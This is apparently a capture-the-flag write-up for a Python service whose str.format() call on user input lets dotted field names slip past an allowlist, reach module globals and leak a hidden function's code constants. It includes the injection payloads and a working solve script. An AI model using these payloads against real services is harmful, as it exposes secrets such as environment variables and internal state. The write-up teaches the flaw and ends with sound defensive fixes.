## Overview

Vipère is a Medium **Misc** challenge: a small Python TCP service that formats
attacker-controlled text with `str.format()`. It looks locked down — a "secure
dispatcher" only lets three named functions run — but two chained tricks turn the
formatter into an arbitrary object-graph reader. Because `str.format` can *read* but
never *call*, the flag is recovered by leaking a function's compiled code object and
reconstructing it offline. The flaw is a [Python format-string / template
injection](https://cwe.mitre.org/data/definitions/1336.html) ([CWE-1336](https://cwe.mitre.org/data/definitions/1336.html)).

## The technique

The server loops on:

```python
text = interface.get_input()
requested_commands = [fname for _, fname, _, _ in Formatter().parse(text) if fname]
secure_commands = SecureCommands(requested_commands)
interface.print(text.format(**secure_commands.dispatcher))
```

`dispatcher` maps three names to **bound methods**, and a gate only *calls* an entry
whose extracted field name is **exactly** a dispatcher key:

```python
self.dispatcher = {"whoami": self.whoami, "get_time": self.get_time, "get_version": self.get_version}

def verify_commands(self):
    for cmd in self.requested_commands:
        if cmd in self.dispatcher and callable(self.dispatcher[cmd]):
            self.dispatcher[cmd] = self.dispatcher[cmd]()   # only EXACT-match keys get called
```

**Trick 1 — dotted field name keeps a bound method un-called.**
`Formatter().parse()` returns the *whole dotted path* as the field name. So the field
`whoami.__self__.get_infected.__globals__` has an extracted name that is **not** a
dispatcher key — `verify_commands` never replaces `dispatcher["whoami"]`, and at format
time it is still the bound method `self.whoami`. `str.format` then walks it:

```
whoami.__self__                 -> the SecureCommands instance
      .get_infected.__globals__ -> the module globals (os, subprocess, server, ...)
      [server].bridge.db        -> the live SecureDatabase instance
```

A `{key}` inside a format field is always a literal **string** key, so `__globals__[server]`
means `globals()["server"]`. Any allowlist that gates on *equality* to a key is defeated by
any field with a trailing `.attr` or `[idx]`.

**Trick 2 — read-only code-object leak.**
`str.format` can only `getattr`/`getitem` — it can never call. The flag is assembled inside
a `get_credentials()` method that nothing invokes. So instead of calling it, leak its code
object and rebuild it locally. First enumerate methods, then read the constants:

```
{whoami.__self__.get_infected.__globals__[server].bridge.db.__class__.__dict__}
# -> ... 'get_credentials': <function SecureDatabase.get_credentials> ...

{...db.get_credentials.__code__.co_consts}
# (None, 72, 'apts_c', 'BT', -1, 'orc', 109, 'ocoh', 'iss', 123, 'p', 'n', '_h', 4, 125, '0', '1', '4', ('o','l','a'))
```

Hand-decoding the Python-3.8 bytecode (`chr`, `[::-1]` slices, `.replace`, a
`BUILD_CONST_KEY_MAP` leetspeak dict, a `replace` loop) recovers the algorithm and the flag.

## Solution

`solve.py` leaks `co_consts` live from the target and rebuilds the flag — no call needed:

```python
import socket, time, ast

HOST, PORT = "TARGET", 1337
BASE = "whoami.__self__.get_infected.__globals__[server].bridge.db.get_credentials.__code__"

def leak(field):
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.settimeout(1.5); time.sleep(0.4)
    s.sendall(("{%s}" % field).encode() + b"\n")
    data = b""
    while True:
        try:
            c = s.recv(8192)
        except Exception:
            break
        if not c:
            break
        data += c
    s.close()
    return data.decode(errors="replace").split("=> ", 1)[1].split("\n\nWhich", 1)[0].strip()

co = ast.literal_eval(leak(BASE + ".co_consts"))
# decoded get_credentials (Python 3.8):
#   chr(72)+'BT'[::-1]+chr(123)+'orc'[::-1]+'iss'+'apts_c'.replace('p','n')+'ocoh'[::-1]+'_h'+chr(109)*4+chr(125)
#   then leetspeak o->0, l->1, a->4
f = chr(co[1]) + co[3][::-1] + chr(co[9]) + co[5][::-1] + co[8] + co[2].replace('p', 'n') \
    + co[7][::-1] + '_h' + chr(co[6]) * 4 + chr(co[14])
for k, v in {'o': '0', 'l': '1', 'a': '4'}.items():
    f = f.replace(k, v)
print(f)   # HTB{...}
```

The local box ran Python 3.13, so the 3.8 bytecode won't *execute* — decode it by hand
rather than `exec`-ing a foreign-version code object. Other pure-read sinks the same object
graph exposes: `{...__globals__[os].environ}` and `{obj.__dict__}`.

## Why it worked

`str.format` on attacker input exposes the *entire live object graph* reachable from any
argument it is handed — attributes and dict/index keys — with no parentheses and no calls.
The "a dispatcher dict is safe" folklore only holds when the input equals a key; a dotted
field both skips the equality gate that would have overwritten the callable and reaches
`__globals__`. Once you are in module globals, even a function that is never invoked leaks
its secret through `__code__.co_consts`.

## Fix / defense

- Never call `.format()` / `%` / build f-strings on untrusted input. Use a fixed template and
  pass user data as values only (`"{}".format(value)`, not `value.format(...)`), or escape
  `{` / `}`.
- If user text must be templated, restrict field names with a strict allowlist **after**
  parsing (reject any name containing `.` or `[`), and pass **plain data** — never live
  objects, bound methods, or modules — into `format(**mapping)`.
- Don't rely on "we never call the sensitive function": its `__code__` and constants are
  still readable. Keep secrets out of code constants and out of any object reachable from a
  module global.
